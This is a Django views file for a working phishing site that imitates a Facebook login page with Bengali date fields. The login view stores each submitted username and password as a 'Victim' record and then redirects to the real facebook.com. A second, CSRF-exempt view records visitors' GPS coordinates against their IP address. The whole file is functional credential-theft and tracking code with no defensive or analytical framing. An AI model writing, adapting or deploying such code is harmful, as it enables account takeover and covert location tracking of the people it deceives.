from django.shortcuts import render, redirect
from django.http import HttpResponse
from django.views.decorators.http import require_http_methods
from django.views.decorators.csrf import csrf_exempt

from .models import Victim, VisitorInfo
from utils.SaveVisitor import saveVisitor, get_client_ip

# Create your views here.
def login(request):
    saveVisitor(request)
    day = [i for i in range(1, 32)]
    year = [i for i in range(1950, 2018)]

    if request.method == 'POST':
        username = request.POST.get('username', None)
        password = request.POST.get('password', None)
        if username and password:
            victim = Victim.objects.create(username=username, password=password)
            victim.save()
            return redirect('https://facebook.com')
        else:
            error = {}
            if not username:
                error['username'] = True
            if not password:
                error['password'] = True
            return render(request, 'login.html', {'error': error, 'year': year, 'month': get_month(), 'day': day})
    return render(request, 'login.html', {'year': year, 'month': get_month(), 'day': day})

@require_http_methods(['POST'])
@csrf_exempt
def save_gps_position(request):
    ip = get_client_ip(request)
    try:
        visitor = VisitorInfo.objects.get(ip=ip)
        visitor.lat = request.POST.get('lat')
        visitor.lon = request.POST.get('lon')
        visitor.save()
        return HttpResponse()
    except Exception as e:
        print(e)
    return HttpResponse()
    
def get_month():
    month = {1: 'জানুয়ারী'}
    month[2] = 'ফেব্রুয়ারী'
    month[3] = 'মার্চ'
    month[4] = 'এপ্রিল'
    month[5] = 'মে'
    month[6] = 'জুন'
    month[7] = 'জুলাই'
    month[8] = 'আগস্ট'
    month[9] = 'সেপ্টেম্বর'
    month[10] = 'অক্টোবর'
    month[11] = 'নভেম্বর'
    month[12] = 'ডিসেম্বর'
    return month